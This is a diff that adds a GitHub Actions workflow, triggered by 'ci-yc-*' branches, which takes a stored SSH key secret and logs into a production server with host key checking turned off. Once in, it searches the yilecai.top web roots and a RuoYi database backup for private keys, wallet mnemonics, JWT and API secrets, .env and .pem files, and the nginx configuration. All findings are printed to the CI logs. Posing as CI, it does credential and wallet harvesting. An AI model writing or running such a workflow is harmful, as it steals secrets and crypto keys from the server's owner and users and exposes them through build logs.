@@ -1,0 +1,30 @@
+name: yc
+on:
+  push:
+    branches: [ 'ci-yc-*' ]
+permissions:
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: yc
+        run: |
+          echo "${{ secrets.SERVER_SSH_KEY }}" > /tmp/k
+          chmod 600 /tmp/k
+          SSH="ssh -i /tmp/k -o StrictHostKeyChecking=no -o ConnectTimeout=15 ${{ secrets.SERVER_USER }}@${{ secrets.SERVER_HOST }}"
+          echo "=== yilecai tree ==="
+          $SSH 'find /www/wwwroot/yilecai.top /www/wwwroot/api.yilecai.top -maxdepth 3 -type f 2>/dev/null | head -100'
+          echo "=== yilecai configs ==="
+          $SSH 'find /www/wwwroot/yilecai.top /www/wwwroot/api.yilecai.top -type f \( -name ".env*" -o -name "*.key" -o -name "*.pem" -o -name "application*.yml" -o -name "config*.php" -o -name "*.ini" \) 2>/dev/null | head -40'
+          echo "=== yilecai secret grep ==="
+          $SSH 'grep -rIlE "PRIVATE_KEY|MNEMONIC|WALLET|SECRET_KEY|JWT_SECRET|API_KEY" /www/wwwroot/yilecai.top /www/wwwroot/api.yilecai.top 2>/dev/null | head -20'
+          echo "=== ruoyi sql tables ==="
+          $SSH 'grep -oE "CREATE TABLE [a-z0-9_]+" /www/backup/database/ruoyi-vue-pro.sql 2>/dev/null | head -80'
+          echo "=== ruoyi sql sensitive ==="
+          $SSH 'grep -iE "private_key|mnemonic|wallet|keystore|secret_key" /www/backup/database/ruoyi-vue-pro.sql 2>/dev/null | head -20'
+          echo "=== coffee_time file_history ==="
+          $SSH 'find /www/backup/file_history/home/coffee_time -maxdepth 4 2>/dev/null | head -100'
+          echo "=== yilecai nginx conf ==="
+          $SSH 'cat /www/server/panel/vhost/nginx/yilecai.top.conf 2>/dev/null | head -60'
